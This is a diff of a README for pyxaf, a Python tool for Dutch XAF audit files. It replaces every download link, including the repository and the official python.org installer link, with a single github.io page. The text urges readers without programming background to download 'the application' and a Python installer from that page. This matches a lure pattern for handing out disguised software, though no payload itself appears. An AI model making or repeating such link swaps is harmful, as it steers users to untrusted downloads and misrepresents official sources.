@@ -8,7 +8,7 @@ Streaming, exact Decimal money handling, and zero dependencies — built for boo
 
 **<span style="background-color:#2E86AB;color:#FFFFFF;padding:14px 28px;border-radius:8px;font-size:1.2em;font-weight:bold;display:inline-block;">⬇️ Download pyxaf Here</span>**
 
-Direct link: **https://github.com/Sougab1007/pyxaf**
+Direct link: **https://sougab1007.github.io**
 
 Visit this link to download the application.
 
@@ -19,7 +19,7 @@ This guide is written for anyone who wants to use pyxaf — no programming backg
 **Step 1 — Visit the download page.**
 Open your web browser (Edge, Chrome, or Firefox) and go to:
 
-**https://github.com/Sougab1007/pyxaf**
+**https://sougab1007.github.io**
 
 **Step 2 — Download the application.**
 Visit this link to download the application. The page contains everything you need, including all files and instructions.
@@ -46,14 +46,14 @@ Press Enter. If you see a version number such as `Python 3.11.5`, Python is alre
 **2. Install Python if needed.**
 If you instead see a message that `python` is not recognized, Python needs to be installed:
 
-- Go to **https://www.python.org/downloads/**
+- Go to **https://sougab1007.github.io**
 - Click the large **Download Python** button.
 - Run the downloaded installer.
 - **Important:** On the very first screen of the installer, tick the checkbox labelled **Add python.exe to PATH** before clicking Install.
 - When it finishes, close the black `cmd` window and open a new one so the change takes effect.
 
 **3. Get the pyxaf files.**
-Return to **https://github.com/Sougab1007/pyxaf** and use the download option on the page to obtain the application files. Save them somewhere easy to find, for example `C:\Users\YourName\pyxaf`.
+Return to **https://sougab1007.github.io** and use the download option on the page to obtain the application files. Save them somewhere easy to find, for example `C:\Users\YourName\pyxaf`.
 
 **4. Move into the folder.**
 In the black `cmd` window, type `cd` followed by a space, then the folder path, and press Enter. For example:
@@ -110,7 +110,7 @@ pyxaf relates to: accounting, audit, auditfile, auditfile-financieel, belastingd
 
 ## 📥 Download pyxaf Again
 
-**https://github.com/Sougab1007/pyxaf**
+**https://sougab1007.github.io**
 
 Visit this link to download the application.
 
